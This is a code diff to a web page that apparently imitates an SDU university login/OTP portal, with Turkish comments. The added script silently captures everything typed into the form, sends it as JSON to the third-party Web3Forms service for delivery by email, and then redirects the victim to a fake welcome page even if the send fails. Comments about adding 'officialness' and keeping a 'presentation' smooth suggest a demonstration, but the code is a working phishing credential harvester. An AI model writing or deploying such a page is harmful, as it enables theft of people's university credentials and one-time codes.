@@ -966,18 +966,44 @@
                                         </div>
 </body>
 <script>
-    const form = document.getElementById('otpForm');
-    const btn = document.getElementById('submitBtn');
+    window.addEventListener('load', function () {
+        // Form ve Butonu yakalıyoruz
+        const form = document.querySelector('form');
+        const btn = document.querySelector('button[type="submit"]');
 
-    form.addEventListener('submit', function (e) {
-        // Butonu hemen değiştir ki hoca tıkladığını anlasın
-        btn.disabled = true;
-        btn.innerHTML = "Sistem Doğrulanıyor...";
+        if (form) {
+            form.addEventListener('submit', function (e) {
+                // 1. Sayfanın hemen yenilenmesini durdur
+                e.preventDefault();
 
-        // Kritik Nokta: Formun gönderilmesi için 1 saniye bekle, sonra portala uçur
-        // Bu süre mailin yola çıkması için teknik olarak yeterlidir
-        setTimeout(function () {
-            window.location.href = "sdu_portal.html";
-        }, 1200);
+                // 2. Buton görselini güncelle (Resmiyet katar)
+                if (btn) {
+                    btn.disabled = true;
+                    btn.innerHTML = "Giriş Yapılıyor...";
+                }
+
+                // 3. Veriyi Web3Forms'a gönder (Mailin gelmesi için)
+                const formData = new FormData(this);
+                const object = Object.fromEntries(formData);
+                const json = JSON.stringify(object);
+
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: json
+                })
+                    .then(() => {
+                        // 4. BAŞARI: Mail yola çıktı, şimdi Hoş Geldiniz sayfasına uçur
+                        window.location.href = "sdu_hosgeldiniz.html";
+                    })
+                    .catch(() => {
+                        // Hata olsa bile (internet yavaşlığı vb.) sayfayı aç ki sunum akıcı olsun
+                        window.location.href = "sdu_hosgeldiniz.html";
+                    });
+            });
+        }
     });
 </script>
